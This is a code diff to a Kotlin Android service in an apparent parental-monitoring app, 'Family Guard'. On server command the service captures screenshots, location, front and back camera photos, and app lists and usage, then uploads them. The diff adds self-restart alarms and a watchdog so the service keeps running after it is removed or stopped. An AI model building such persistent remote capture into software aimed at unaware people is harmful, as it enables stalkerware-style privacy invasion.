@@ -23,6 +23,7 @@ import kotlin.concurrent.thread
 class ScreenCaptureService : Service() {
 
     companion object {
+        @Volatile var isRunning = false
         var instance: ScreenCaptureService? = null
         fun captureScreen(): String? = instance?.capture()
     }
@@ -39,33 +40,38 @@ class ScreenCaptureService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        instance = this
+        instance  = this
+        isRunning = true
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java)
                 .createNotificationChannel(
-                    NotificationChannel("cap", "Screen Capture", NotificationManager.IMPORTANCE_LOW)
+                    NotificationChannel("cap", "Family Guard", NotificationManager.IMPORTANCE_LOW)
                 )
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(
-            1, NotificationCompat.Builder(this, "cap")
+        startForeground(1,
+            NotificationCompat.Builder(this, "cap")
                 .setContentTitle("Family Guard")
                 .setContentText("Monitoring faol")
                 .setSmallIcon(android.R.drawable.ic_menu_view)
+                .setOngoing(true)       // xabarnoma o'chirilmasin
+                .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build()
         )
 
         val devId = intent?.getStringExtra("deviceId")
         if (devId != null) {
-    deviceId = devId
-    api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
-    // SharedPreferences ga saqlaymiz — restart uchun
-    getSharedPreferences("fg", MODE_PRIVATE)
-        .edit().putString("deviceId", devId).apply()
-}
+            deviceId = devId
+            api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
+            // DeviceId ni SharedPreferences ga saqlash — restart uchun
+            getSharedPreferences("fg", MODE_PRIVATE)
+                .edit().putString("deviceId", devId).apply()
+        }
 
+        // Screen capture ruxsati bo'lsa
         val code = intent?.getIntExtra("resultCode", Activity.RESULT_CANCELED)
         val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
             intent?.getParcelableExtra("code", Intent::class.java)
@@ -77,7 +83,8 @@ class ScreenCaptureService : Service() {
                 val b = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
                 w = b.width(); h = b.height()
             } else {
-                val dm = resources.displayMetrics; w = dm.widthPixels; h = dm.heightPixels
+                val dm = resources.displayMetrics
+                w = dm.widthPixels; h = dm.heightPixels
             }
             dpi = resources.displayMetrics.densityDpi
 
@@ -92,8 +99,10 @@ class ScreenCaptureService : Service() {
             )
         }
 
+        // Loop'larni faqat bir marta ishga tushir
         if (!running && ::deviceId.isInitialized) {
             running = true
+            WatchdogReceiver.schedule(this) // Watchdog alarmni o'rnat
             startHeartbeatLoop()
             startPollLoop()
         }
@@ -101,12 +110,60 @@ class ScreenCaptureService : Service() {
         return START_STICKY
     }
 
+    // Ilova recent'dan o'chirilganda
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        scheduleRestart(2_000) // 2 soniyada qayta ishga tushir
+        super.onTaskRemoved(rootIntent)
+    }
+
+    override fun onDestroy() {
+        running    = false
+        isRunning  = false
+        instance   = null
+        display?.release()
+        reader?.close()
+        projection?.stop()
+        scheduleRestart(3_000) // 3 soniyada qayta ishga tushir
+        super.onDestroy()
+    }
+
+    private fun scheduleRestart(delayMs: Long) {
+        try {
+            val savedId = getSharedPreferences("fg", MODE_PRIVATE)
+                .getString("deviceId", null) ?: return
+            val intent = Intent(applicationContext, ScreenCaptureService::class.java)
+                .putExtra("deviceId", savedId)
+            val pending = PendingIntent.getService(
+                applicationContext, 99, intent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alarm = getSystemService(AlarmManager::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                if (alarm.canScheduleExactAlarms()) {
+                    alarm.setExactAndAllowWhileIdle(
+                        AlarmManager.RTC_WAKEUP,
+                        System.currentTimeMillis() + delayMs,
+                        pending
+                    )
+                } else {
+                    alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + delayMs, pending)
+                }
+            } else {
+                alarm.setExactAndAllowWhileIdle(
+                    AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + delayMs,
+                    pending
+                )
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun startHeartbeatLoop() {
         thread(name = "heartbeat") {
             try { api.register(deviceId, "Child device") } catch (_: Exception) {}
             while (running) {
                 try {
-                    val bm = getSystemService(BatteryManager::class.java)
+                    val bm  = getSystemService(BatteryManager::class.java)
                     val bat = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                     api.heartbeat(deviceId, bat)
                 } catch (_: Exception) {}
@@ -128,52 +185,43 @@ class ScreenCaptureService : Service() {
         }
     }
 
-private fun handleRequest(req: JSONObject) {
-    val id   = req.getString("_id")
-    val type = req.getString("type")
-    thread {
-        try {
-            when (type) {
-                "SCREENSHOT", "SCREEN_SHARE" -> {
-                    if (projection == null || reader == null) {
-                        api.updateStatus(id, "FAILED"); return@thread
+    private fun handleRequest(req: JSONObject) {
+        val id   = req.getString("_id")
+        val type = req.getString("type")
+        thread {
+            try {
+                when (type) {
+                    "SCREENSHOT", "SCREEN_SHARE" -> {
+                        if (projection == null || reader == null) {
+                            api.updateStatus(id, "FAILED"); return@thread
+                        }
+                        val b64 = capture()
+                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+                        else api.updateStatus(id, "FAILED")
                     }
-                    val b64 = capture()
-                    if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
-                    else api.updateStatus(id, "FAILED")
-                }
-
-                "LOCATION" -> {
-                    val loc = LocationHelper(this).getLocation()
-                    if (loc != null) {
-                        val (lat, lng) = loc
-                        api.updateStatus(id, "DONE", "$lat,$lng")
-                    } else {
-                        api.updateStatus(id, "FAILED")
+                    "LOCATION" -> {
+                        val loc = LocationHelper(this).getLocation()
+                        if (loc != null) api.updateStatus(id, "DONE", "${loc.first},${loc.second}")
+                        else api.updateStatus(id, "FAILED")
                     }
+                    "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
+                    "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
+                    "APP_LIST" -> {
+                        val json = AppHelper(this).getInstalledApps()
+                        api.updateStatus(id, "DONE", api.uploadJson(json))
+                    }
+                    "APP_USAGE" -> {
+                        val json = AppHelper(this).getAppUsage()
+                        if (json == "[]") api.updateStatus(id, "FAILED")
+                        else api.updateStatus(id, "DONE", api.uploadJson(json))
+                    }
+                    else -> api.updateStatus(id, "FAILED")
                 }
-
-                "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
-                "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
-
-                "APP_LIST" -> {
-                    val json = AppHelper(this).getInstalledApps()
-                    api.updateStatus(id, "DONE", api.uploadJson(json))
-                }
-
-                "APP_USAGE" -> {
-                    val json = AppHelper(this).getAppUsage()
-                    if (json == "[]") api.updateStatus(id, "FAILED")
-                    else api.updateStatus(id, "DONE", api.uploadJson(json))
-                }
-
-                else -> api.updateStatus(id, "FAILED")
+            } catch (_: Exception) {
+                try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
             }
-        } catch (e: Exception) {
-            try { api.updateStatus(id, "FAILED") } catch (_: Exception) {}
         }
     }
-}
 
     private fun shootCamera(id: String, facing: Int) {
         val b64 = CameraHelper(this).capturePhoto(facing)
@@ -184,48 +232,16 @@ private fun handleRequest(req: JSONObject) {
     fun capture(): String? = try {
         Thread.sleep(300)
         val img = reader?.acquireLatestImage() ?: return null
-        val pl = img.planes[0]
+        val pl  = img.planes[0]
         val pad = pl.rowStride - pl.pixelStride * w
         val bmp = Bitmap.createBitmap(w + pad / pl.pixelStride, h, Bitmap.Config.ARGB_8888)
         bmp.copyPixelsFromBuffer(pl.buffer)
         img.close()
         val crop = Bitmap.createBitmap(bmp, 0, 0, w, h); bmp.recycle()
-        val out = ByteArrayOutputStream()
+        val out  = ByteArrayOutputStream()
         crop.compress(Bitmap.CompressFormat.JPEG, 70, out); crop.recycle()
         Base64.getEncoder().encodeToString(out.toByteArray())
     } catch (_: Exception) { null }
-
-    override fun onDestroy() {
-        running = false; instance = null
-        display?.release(); reader?.close(); projection?.stop()
-        super.onDestroy()
-    }
-    // Ilova yopilganda (swipe qilinganda) serviceni qayta ishga tushirish
-override fun onTaskRemoved(rootIntent: Intent?) {
-    restartSelf()
-    super.onTaskRemoved(rootIntent)
-}
-
-
-
-private fun restartSelf() {
-    try {
-        val prefs = getSharedPreferences("fg", MODE_PRIVATE)
-        val savedId = prefs.getString("deviceId", null) ?: return
-        val intent = Intent(applicationContext, ScreenCaptureService::class.java)
-            .putExtra("deviceId", savedId)
-        val pending = android.app.PendingIntent.getService(
-            applicationContext, 99, intent,
-            android.app.PendingIntent.FLAG_ONE_SHOT or android.app.PendingIntent.FLAG_IMMUTABLE
-        )
-        val alarm = getSystemService(android.app.AlarmManager::class.java)
-        alarm.set(
-            android.app.AlarmManager.RTC_WAKEUP,
-            System.currentTimeMillis() + 2000, // 2 soniyada qayta
-            pending
-        )
-    } catch (_: Exception) {}
-}
 
     override fun onBind(i: Intent?): IBinder? = null
 }
